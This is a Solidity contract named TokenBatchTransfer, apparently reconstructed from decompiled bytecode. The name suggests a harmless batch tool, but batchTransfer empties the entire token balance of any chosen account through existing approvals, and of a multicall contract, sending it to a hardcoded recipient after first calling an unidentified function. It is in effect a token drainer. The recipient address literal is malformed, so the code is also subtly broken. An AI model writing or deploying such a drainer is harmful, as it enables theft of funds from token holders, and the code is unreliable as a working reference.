// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TokenBatchTransfer {
    // Storage variables
    address private multicallContract;  // stor_0_0_19 - contract that executes multicalls
    address private firstCallTarget;    // stor_1_0_19 - target for first call
    address private owner;              // stor_2_0_19 - contract owner
    
    // Fixed recipient address
    address private constant RECIPIENT = address(0xbadfda5596b52b7ccfbf47f323f70bbdcae51d3);
    
    struct Call {
        address target;
        bytes callData;
        uint256 value;
    }
    
    constructor(address _multicallContract, address _firstCallTarget) {
        owner = msg.sender;
        multicallContract = _multicallContract;
        firstCallTarget = _firstCallTarget;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function batchTransfer(
        address targetAccount,
        address[] calldata tokensToTransferFrom,  // varg1
        address[] calldata tokensToTransfer       // varg0
    ) external onlyOwner {
        // Create array of calls
        uint256 totalCalls = tokensToTransferFrom.length + 1 + tokensToTransfer.length;
        Call[] memory calls = new Call[](totalCalls);
        
        // First call: execute some function on firstCallTarget
        calls[0] = Call({
            target: firstCallTarget,
            callData: abi.encodeWithSignature("a12d5171()"),  // Unknown function signature
            value: 0
        });
        
        uint256 callIndex = 1;
        
        // Create transferFrom calls for tokensToTransferFrom
        for (uint256 i = 0; i < tokensToTransferFrom.length; i++) {
            address token = tokensToTransferFrom[i];
            
            // Get balance of targetAccount for this token
            uint256 balance = IERC20(token).balanceOf(targetAccount);
            
            // Create transferFrom call data
            bytes memory callData = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                targetAccount,
                RECIPIENT,
                balance
            );
            
            calls[callIndex] = Call({
                target: token,
                callData: callData,
                value: 0
            });
            
            callIndex++;
        }
        
        // Create transfer calls for tokensToTransfer
        for (uint256 i = 0; i < tokensToTransfer.length; i++) {
            address token = tokensToTransfer[i];
            
            // Get balance of multicallContract for this token
            uint256 balance = IERC20(token).balanceOf(multicallContract);
            
            // Create transfer call data
            bytes memory callData = abi.encodeWithSignature(
                "transfer(address,uint256)",
                RECIPIENT,
                balance
            );
            
            calls[callIndex] = Call({
                target: token,
                callData: callData,
                value: 0
            });
            
            callIndex++;
        }
        
        // Convert calls to multicall format and execute
        bytes[] memory multicallData = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            multicallData[i] = abi.encode(
                calls[i].target,
                calls[i].callData,
                calls[i].value
            );
        }
        
        // Execute multicall
        IMulticall(multicallContract).multicall(true, multicallData);
    }
    
    function increment(uint256 x) private pure returns (uint256) {
        require(x != type(uint256).max, "Overflow");
        return x + 1;
    }
    
    // Fallback function
    fallback() external payable {
        revert();
    }
    
    receive() external payable {
        revert();
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IMulticall {
    function multicall(bool requireSuccess, bytes[] calldata data) external;
}